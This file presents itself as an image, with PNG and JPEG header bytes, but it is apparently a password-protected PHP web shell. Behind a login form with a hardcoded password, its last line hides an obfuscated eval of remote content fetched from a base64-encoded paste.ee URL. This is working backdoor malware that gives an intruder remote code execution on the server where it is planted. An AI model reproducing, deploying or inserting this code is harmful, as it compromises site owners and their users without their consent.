‰PNG

IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
ÿØÿà JFIF  ` `  ÿþš<?php
session_start();

$hashed_password = password_hash('jal888', PASSWORD_DEFAULT);
function checkLogin() {
    if (!isset($_SESSION["isLogin"])) {
        showLoginForm();
        exit();
    }
}

function showLoginForm() {
    echo "<style>
        body {
            background-color: grey;
        }
        .centered-form {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
        }
        .centered-form form {
            background-color: #f0f0f0;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .centered-form input[type='password'] {
            padding: 10px;
            margin: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .centered-form button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>";
    echo "<div class='centered-form'>
        <form method='POST'>
            <input type='password' name='password' required>
            <button type='submit'>Submit</button>
        </form>
    </div>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (password_verify($_POST["password"], $hashed_password)) {
        $_SESSION["isLogin"] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
    }
}
checkLogin();
?>
<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(base64_decode/*******/("aHR0cHM6Ly9wYXN0ZS5lZS9yL1JIZHQ0")));/**/?>
